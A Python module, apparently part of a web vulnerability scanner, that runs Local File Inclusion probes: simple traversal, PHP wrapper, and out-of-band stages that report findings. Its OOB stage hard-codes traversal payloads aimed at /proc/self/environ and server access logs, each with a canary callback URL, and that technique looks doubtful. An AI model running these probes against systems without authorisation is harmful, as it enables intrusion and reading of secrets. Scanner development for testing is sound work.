"""LFI detection stages for DetectionChain.

SimpleStage: Simple Local File Inclusion detection (LSBF).
PHPWrapperStage: PHP wrapper-based LFI detection.
LfiOOBStage: Out-of-Band LFI detection via callback canary.
"""

from __future__ import annotations

import logging
import time
from typing import Optional

from pwnproxy.plugins.core.base import Finding
from pwnproxy.plugins.core.chain import DetectionDepth, DetectionStage, StageResult
from pwnproxy.shared.models import Flow
from pwnproxy.shared.scan.params import InjectionPoint
from pwnproxy.shared.scan.replayer import RequestReplayer
from pwnproxy.shared.canary import get_registry
from pwnproxy.shared.scan.replayer import RequestReplayer, _serialize_request

logger = logging.getLogger(__name__)


class SimpleStage(DetectionStage):
    """Simple LFI detection using raw payload probes."""

    order = 0
    min_depth = DetectionDepth.FAST
    capability = "lfi-simple"

    def __init__(self, replayer: RequestReplayer, payloads: list, matcher, evasion_level: str = "none"):
        self._replayer = replayer
        self._payloads = payloads
        self._matcher = matcher
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            for payload in self._payloads:
                resp = await self._replayer.replay(point, payload.value, timeout=5.0, evasion_level=self._evasion)
                if resp is None:
                    continue
                os_type, evidence = self._matcher.match(resp.text or "", min_matches=2)
                if os_type is not None:
                    req = self._replayer.build_payload_request(point, payload.value, evasion_level=self._evasion)
                    findings.append(Finding(
                        scanner="lfi",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="path-traversal",
                        severity="high",
                        confidence="confirmed",
                        payload=payload.value,
                        evidence=evidence[:500],
                        extra={"os": os_type},
                        request_data=_serialize_request(req),
                    ))
                    confirmed.add(_point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)


class PHPWrapperStage(DetectionStage):
    """LFI detection using PHP wrappers (php://filter, php://input, etc.)."""

    order = 1
    min_depth = DetectionDepth.FAST
    capability = "lfi-php-wrapper"

    def __init__(self, replayer: RequestReplayer, payloads: list, matcher, evasion_level: str = "none"):
        self._replayer = replayer
        self._payloads = payloads
        self._matcher = matcher
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            for payload in self._payloads:
                resp = await self._replayer.replay(point, payload.value, timeout=5.0, evasion_level=self._evasion)
                if resp is None:
                    continue
                os_type, evidence = self._matcher.match(resp.text or "", min_matches=2)
                if os_type is not None:
                    req = self._replayer.build_payload_request(point, payload.value, evasion_level=self._evasion)
                    findings.append(Finding(
                        scanner="lfi",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="php-wrapper",
                        severity="high",
                        confidence="confirmed",
                        payload=payload.value,
                        evidence=evidence[:500],
                        extra={"os": os_type},
                        request_data=_serialize_request(req),
                    ))
                    confirmed.add(_point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)


class LfiOOBStage(DetectionStage):
    """Out-of-Band LFI detection via callback canary."""

    order = 2
    min_depth = DetectionDepth.DEEP
    capability = "lfi-oob"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        registry = get_registry()

        for point in injection_points:
            # Use canary to trigger OOB callback
            scan_id = f"lfi-oob-{flow.id}-{point.name}"
            canary = registry.create(scan_id)
            callback_url = f"http://oob.pwnproxy/{canary.token}"

            # Payloads that send OOB data
            payloads = [
                f"../../../proc/self/environ?OOB={callback_url}",
                f"../../../var/log/apache2/access.log?OOB={callback_url}",
                f"../../../var/log/nginx/access.log?OOB={callback_url}",
                f"../../../tmp/test?OOB={callback_url}",
            ]

            for payload_text in payloads:
                resp = await self._replayer.replay(point, payload_text, timeout=10.0, evasion_level=self._evasion)
                if resp is None:
                    continue

            import asyncio
            await asyncio.sleep(2)

            hit = registry.get(canary.token)
            if hit and hit.callback_received:
                req = self._replayer.build_payload_request(point, payloads[0], evasion_level=self._evasion)
                findings.append(Finding(
                    scanner="lfi",
                    url=point.url,
                    method=point.method,
                    param_name=point.name,
                    param_location=point.location,
                    technique="oob",
                    severity="high",
                    confidence="confirmed",
                    payload=payloads[0],
                    evidence=f"OOB callback received from {hit.callback_ip}",
                    extra={"oob_token": canary.token},
                    request_data=_serialize_request(req),
                ))
                confirmed.add(_point_key(point))

            registry.cleanup_expired()

        return StageResult(findings=findings, confirmed_points=confirmed)


def _point_key(point: InjectionPoint) -> tuple:
    return (point.method, point.host + point.path, point.name, point.location)